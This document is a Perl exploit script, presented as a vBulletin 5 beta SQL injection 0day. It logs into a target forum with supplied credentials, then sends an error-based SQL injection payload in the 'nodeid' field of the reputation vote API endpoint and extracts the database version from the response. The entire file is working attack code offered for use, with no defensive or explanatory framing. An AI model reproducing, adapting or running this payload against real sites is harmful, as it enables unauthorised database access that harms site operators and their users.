#!/usr/bin/perl
use LWP::UserAgent;
use HTTP::Cookies;
use HTTP::Request::Common;
use MIME::Base64;
system $^O eq 'MSWin32' ? 'cls' : 'clear';
print "
+===================================================+
|           vBulletin 5 Beta XX SQLi 0day           |
|              Author: Orestis Kourides             |
|             Web Site: www.cyitsec.net             |
+===================================================+
";
  
if (@ARGV != 5) {
    print "\r\nUsage: perl vb5exp.pl WWW.HOST.COM VBPATH URUSER URPASS 
MAGICNUM\r\n";
    exit;
}
  
$host       = $ARGV[0];
$path       = $ARGV[1];
$username   = $ARGV[2];
$password   = $ARGV[3];
$magicnum   = $ARGV[4];
$encpath    = encode_base64('http://'.$host.$path);
print "[+] Logging\n";
print "[+] Username: ".$username."\n";
print "[+] Password: ".$password."\n";
print "[+] MagicNum: ".$magicnum."\n";
print "[+] " .$host.$path."auth/login\n";
my $browser = LWP::UserAgent->new;
my $cookie_jar = HTTP::Cookies->new;
my $response = $browser->post( 'http://'.$host.$path.'auth/login',
    [
        'url' => $encpath,
        'username' => $username,
        'password' => $password,
    ],
    Referer => 
'http://'.$host.$path.'auth/login-form?url=http://'.$host.$path.'',
    User-Agent => 'Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 
Firefox/13.0',
);
$browser->cookie_jar( $cookie_jar );
my $browser = LWP::UserAgent->new;
$browser->cookie_jar( $cookie_jar );
print "[+] Requesting\n";
my $response = $browser->post( 
'http://'.$host.$path.'index.php/ajax/api/reputation/vote',
    [
        'nodeid' => $magicnum.') and(select 1 from(select 
count(*),concat((select (select concat(0x23,cast(version() as 
char),0x23)) from information_schema.tables limit 
0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND 
(1338=1338',
    ],
    User-Agent => 'Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 
Firefox/13.0',
);
$data = $response->content;
if ($data =~ /(#((\\.)|[^\\#])*#)/) { print '[+] Version: '.$1 };
print "\n";
exit 1;





